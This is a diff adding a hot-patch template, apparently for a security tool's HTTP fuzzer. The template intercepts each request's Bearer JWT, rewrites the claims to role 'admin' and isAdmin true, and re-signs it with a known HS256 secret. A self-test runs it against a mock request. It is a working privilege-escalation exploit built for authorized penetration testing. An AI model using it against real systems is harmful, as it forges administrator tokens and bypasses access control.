@@ -1,0 +1,81 @@
+/*
+模版名称: [JWT] HS256 重签名
+对应 i18n key: HTTPFuzzerHotPatch.jwt_hs256_resign
+关键词: JWT, HS256, beforeRequest, 重签名, 权限提升
+适用场景: 已知 HS256 secret，在每次发包前解析 Authorization 中的 JWT，修改 payload 后重新签名
+默认逻辑: 把 payload 中的 role 改成 admin（可根据实际场景修改 mutateClaims）
+*/
+
+// ===== HOT PATCH TEMPLATE START =====
+// JWT HS256 重签名 - 修改 payload 后用已知 secret 重新签名
+jwtSecret = []byte("mysecret")  /* 替换为目标系统的 HS256 secret */
+
+mutateClaims = func(claims) {
+    /* 在此处修改 payload，例如权限提升 */
+    claims["role"] = "admin"
+    claims["isAdmin"] = true
+    return claims
+}
+
+resignJwt = func(token) {
+    parts = str.Split(token, ".")
+    if len(parts) != 3 {
+        return token
+    }
+    payloadBytes = codec.DecodeBase64Url(parts[1])~
+    claims = json.loads(string(payloadBytes))
+    claims = mutateClaims(claims)
+    newToken = jwt.JWTGenerate("HS256", claims, jwtSecret)~
+    return newToken
+}
+
+beforeRequest = func(https, originReq, req) {
+    auth = poc.GetHTTPPacketHeader(req, "Authorization")
+    if auth == "" {
+        return req
+    }
+    if !str.HasPrefix(auth, "Bearer ") {
+        return req
+    }
+    token = str.TrimPrefix(auth, "Bearer ")
+    newToken = resignJwt(token)
+    return poc.ReplaceHTTPPacketHeader(req, "Authorization", "Bearer "+newToken)
+}
+// ===== HOT PATCH TEMPLATE END =====
+
+// 本地自测代码
+func runSelfTest() {
+    log.info("start jwt hs256 resign self test")
+
+    origClaims = {"sub": "alice", "role": "user"}
+    origToken = jwt.JWTGenerate("HS256", origClaims, jwtSecret)~
+    log.info("orig token: " + origToken)
+
+    mockReq = `GET /api/profile HTTP/1.1
+Host: api.example.com
+Authorization: Bearer ` + origToken + `
+
+`
+
+    signedReq = beforeRequest(true, []byte(mockReq), []byte(mockReq))
+    log.info("modified request:\n" + string(signedReq))
+
+    newAuth = poc.GetHTTPPacketHeader(signedReq, "Authorization")
+    assert str.HasPrefix(newAuth, "Bearer "), "auth should start with Bearer"
+    newToken = str.TrimPrefix(newAuth, "Bearer ")
+    log.info("new token: " + newToken)
+    assert newToken != origToken, "token should be different"
+
+    parts = str.Split(newToken, ".")
+    assert len(parts) == 3, "jwt should have 3 parts"
+    payloadBytes = codec.DecodeBase64Url(parts[1])~
+    parsedClaims = json.loads(string(payloadBytes))
+    log.info("new payload: " + string(payloadBytes))
+    assert parsedClaims["role"] == "admin", "role should be admin"
+    assert parsedClaims["isAdmin"] == true, "isAdmin should be true"
+    assert parsedClaims["sub"] == "alice", "sub should be preserved"
+
+    log.info("jwt hs256 resign self test passed")
+}
+
+runSelfTest()
